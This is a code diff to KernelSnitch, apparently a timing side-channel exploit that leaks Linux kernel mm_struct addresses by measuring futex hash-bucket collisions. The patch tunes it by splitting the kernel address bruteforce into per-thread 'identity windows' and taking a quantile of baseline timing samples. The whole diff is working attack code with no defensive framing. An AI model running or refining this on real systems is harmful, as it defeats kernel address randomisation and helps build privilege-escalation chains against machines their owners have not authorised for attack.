@@ -37,6 +37,24 @@
 #define IDENTITY_END   KERNELSNITCH_IDENTITY_END
 #define COARSE_SZ (1ULL << 30)
 
+#ifndef KERNELSNITCH_BASELINE_SAMPLES
+#define KERNELSNITCH_BASELINE_SAMPLES 2
+#endif
+#ifndef KERNELSNITCH_BASELINE_QUANTILE
+#define KERNELSNITCH_BASELINE_QUANTILE 0
+#endif
+#if KERNELSNITCH_BASELINE_SAMPLES < 1 || \
+    KERNELSNITCH_BASELINE_QUANTILE >= KERNELSNITCH_BASELINE_SAMPLES
+#error "invalid KernelSnitch baseline profile"
+#endif
+
+#ifdef KERNELSNITCH_IDENTITY_WINDOWS
+struct kernelsnitch_identity_window {
+    size_t start;
+    size_t end;
+};
+#endif
+
 enum kernelsnitch_state {
     KERNELSNITCH_NOT_INIT = 0,
     KERNELSNITCH_INIT,
@@ -218,8 +236,12 @@ static void *__mm_leak(void *arg)
     for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
         if ((coarse_addr % (1ULL << 40)) == 0)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
         size_t coarse_end = coarse_addr + COARSE_SZ;
+#ifdef KERNELSNITCH_IDENTITY_WINDOWS
+        if (coarse_end > range->end)
+            coarse_end = range->end;
+#endif
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
         if (ks->exact_identity_partition && coarse_end > range->end)
             coarse_end = range->end;
         for (size_t slab_addr = coarse_addr; (slab_addr < coarse_end) && !ks->found; slab_addr += mm_slab_sz) {
@@ -231,7 +253,7 @@ static void *__mm_leak(void *arg)
                 candidate_end = slab_addr + mm_slab_sz;
             for (size_t mm_struct_candidate = first_candidate; (mm_struct_candidate < candidate_end) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
 #else
-        for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
+        for (size_t slab_addr = coarse_addr; (slab_addr < coarse_end) && !ks->found; slab_addr += mm_slab_sz) {
             for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
 #endif
 
@@ -405,13 +427,21 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
 #ifndef KERNELSNITCH_BASELINE_SAMPLES
 #define KERNELSNITCH_BASELINE_SAMPLES 8
 #endif
-    size_t approx_time = (size_t)-1;
-    for (int __b = 0; __b < KERNELSNITCH_BASELINE_SAMPLES; ++__b) {
-        size_t __s = MIN(
+#ifndef KERNELSNITCH_BASELINE_QUANTILE
+#define KERNELSNITCH_BASELINE_QUANTILE 0
+#endif
+#if KERNELSNITCH_BASELINE_SAMPLES < 1 || \
+    KERNELSNITCH_BASELINE_QUANTILE >= KERNELSNITCH_BASELINE_SAMPLES
+#error "invalid KernelSnitch baseline profile"
+#endif
+    size_t approx_samples[KERNELSNITCH_BASELINE_SAMPLES];
+    for (size_t i = 0; i < KERNELSNITCH_BASELINE_SAMPLES; ++i)
+        approx_samples[i] = MIN(
             __measure(ks, (size_t)&ks->futexes[0]),
             __measure(ks, (size_t)&ks->futexes[KS_PAGE_SIZE+8]));
-        if (__s < approx_time) approx_time = __s;
-    }
+    qsort(approx_samples, KERNELSNITCH_BASELINE_SAMPLES,
+          sizeof(approx_samples[0]), __compare);
+    size_t approx_time = approx_samples[KERNELSNITCH_BASELINE_QUANTILE];
 
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
@@ -482,6 +512,11 @@ size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
  */
 void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
 {
+#ifdef KERNELSNITCH_IDENTITY_WINDOWS
+    static const struct kernelsnitch_identity_window windows[] =
+        KERNELSNITCH_IDENTITY_WINDOWS;
+    const size_t window_count = sizeof(windows) / sizeof(windows[0]);
+#endif
     ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
     if (ks->verbose) pr_info("start bruteforcing\n");
     reset_cpu_pin();
@@ -490,7 +525,21 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
         struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
         mm_leak_arg->ks = ks;
         mm_leak_arg->range.id = i;
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+#ifdef KERNELSNITCH_IDENTITY_WINDOWS
+        size_t window_id = i % window_count;
+        size_t part_id = i / window_count;
+        size_t part_count =
+            (ks->thread_cnt + window_count - 1) / window_count;
+        size_t span = windows[window_id].end - windows[window_id].start;
+        size_t slab_size = KS_PAGE_SIZE << ks->mm_slab_order;
+        mm_leak_arg->range.start = windows[window_id].start +
+            span * part_id / part_count;
+        mm_leak_arg->range.end = windows[window_id].start +
+            span * (part_id + 1) / part_count;
+        mm_leak_arg->range.start =
+            (mm_leak_arg->range.start + slab_size - 1) & ~(slab_size - 1);
+        mm_leak_arg->range.end &= ~(slab_size - 1);
+#elif defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
         mm_leak_arg->range.start =
             ks->identity_start + ks->identity_diff*i;
         mm_leak_arg->range.end = i + 1 == ks->thread_cnt
@@ -518,10 +567,16 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
         if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
             mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
 #endif
+        if (mm_leak_arg->range.end <= mm_leak_arg->range.start) {
+            free(mm_leak_arg);
+            ks->tids[i] = 0;
+            continue;
+        }
         SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
     }
     for (size_t i = 0; i < ks->thread_cnt; ++i)
-        pthread_join(ks->tids[i], 0);
+        if (ks->tids[i])
+            pthread_join(ks->tids[i], 0);
     ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
 }
 
